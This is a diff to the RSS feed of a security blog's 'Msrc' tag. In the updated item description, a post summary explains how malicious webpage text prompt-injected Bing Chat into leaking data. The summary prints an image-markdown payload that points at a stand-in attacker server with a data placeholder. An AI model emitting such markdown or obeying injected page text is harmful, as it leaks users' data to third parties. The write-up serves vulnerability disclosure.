@@ -4,9 +4,9 @@
     <title>Msrc on Embrace The Red</title>
     <link>https://embracethered.com/blog/tags/msrc/</link>
     <description>Recent content in Msrc on Embrace The Red</description>
-    <generator>Hugo -- gohugo.io</generator>
+    <generator>Hugo</generator>
     <language>en-us</language>
-    <copyright>(c) WUNDERWUZZI 2018-2025</copyright>
+    <copyright>(c) WUNDERWUZZI 2018-2026</copyright>
     <lastBuildDate>Sun, 18 Jun 2023 00:01:02 -0700</lastBuildDate>
     <atom:link href="https://embracethered.com/blog/tags/msrc/index.xml" rel="self" type="application/rss+xml" />
     <item>
@@ -14,7 +14,7 @@
       <link>https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/</link>
       <pubDate>Sun, 18 Jun 2023 00:01:02 -0700</pubDate>
       <guid>https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/</guid>
-      <description>This post describes how I found a Prompt Injection attack angle in Bing Chat that allowed malicious text on a webpage (like a user comment or an advertisement) to exfiltrate data.&#xA;The Vulnerability - Image Markdown Injection When Bing Chat returns text it can return markdown elements, which the client will render as HTML. This includes the feature to include images.&#xA;Imagine the LLM returns the following text:&#xA;![data exfiltration in progress](https://attacker/logo.</description>
+      <description>&lt;p&gt;This post describes how I found a Prompt Injection attack angle in &lt;code&gt;Bing Chat&lt;/code&gt; that allowed malicious text on a webpage (like a user comment or an advertisement) to exfiltrate data.&lt;/p&gt;&#xA;&lt;h2 id=&#34;the-vulnerability---image-markdown-injection&#34;&gt;The Vulnerability - Image Markdown Injection&lt;/h2&gt;&#xA;&lt;p&gt;When Bing Chat returns text it can return markdown elements, which the client will render as HTML. This includes the feature to include images.&lt;/p&gt;&#xA;&lt;p&gt;Imagine the LLM returns the following text:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;![data exfiltration in progress](https://attacker/logo.png?q=[DATA_EXFILTRATION])&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This will be rendered as an HTML image tag with a &lt;code&gt;src&lt;/code&gt; attribute pointing to the &lt;code&gt;attacker&lt;/code&gt; server.&lt;/p&gt;</description>
     </item>
   </channel>
 </rss>
